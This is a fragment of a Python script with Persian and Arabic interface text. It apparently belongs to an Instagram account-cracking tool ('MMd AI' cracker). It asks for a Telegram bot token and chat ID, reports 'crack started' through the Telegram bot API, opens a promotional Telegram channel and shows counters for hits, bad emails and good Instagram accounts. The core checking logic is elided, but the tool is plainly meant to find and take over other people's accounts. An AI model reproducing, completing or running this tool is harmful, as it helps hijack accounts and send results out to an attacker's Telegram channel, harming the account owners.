...
''');print(' \x1b[1;32mتوکن بات را قرار دهید ');tok = input('[⊰⊱]\033[1;37m  TOKEN : ')
print(' \x1b[1;32m ایدی عددی خود را قرار دهید');idd =input('\033[1;32m[⊰⊱]\033[1;37m  ID : ');rd = requests.get('https://api.telegram.org/bot' + str(tok) + '/sendMessage?chat_id=' + str(idd) + '&text= ┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n╮❲ تم کرک شروع شد\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉').text;import webbrowser
webbrowser.open('https://t.me/S628l')
print('تم تشغيل الاداة اشترك ب القناة ')
os.system('clear')
red = "\033[1m\033[31m"
...
def amir():
    os.system('clear')
    output = (f"{cyan}╔════════════════════════════════════════════════════════\n"
              f"{cyan}║ {white}⟿ 𝐇𝐢𝐭𝐬: {green}{hits} "
              f"{white}⟿ 𝐁𝐚𝐝 𝐢𝐧𝐬𝐭𝐚: {red}{badinsta} "
              f"{white}⟿ 𝐁𝐚𝐝 𝐞𝐦𝐚𝐢𝐥: {yellow}{bademail} "
              f"{white}⟿ 𝐆𝐨𝐨𝐝 𝐈𝐆: {orange}{goodig} {cyan}║\n"
              f"{cyan}╚════════════════════════════════════════════════════════\n"
              f"\r")
...
{green}───────────────────────────────────────────
{orange} به کرکر MMd AI خوش اومدین
{green}───────────────────────────────────────────
{magenta}کرک پیج اینستاگرام
{green}───────────────────────────────────────────
...
{green}───────────────────────────────────────────
""")
ilyass = input(f"{white}CHOICE : {reset}")
if ilyass == '1':
    bbk = 10000
    id = 17699999
elif ilyass == '2':
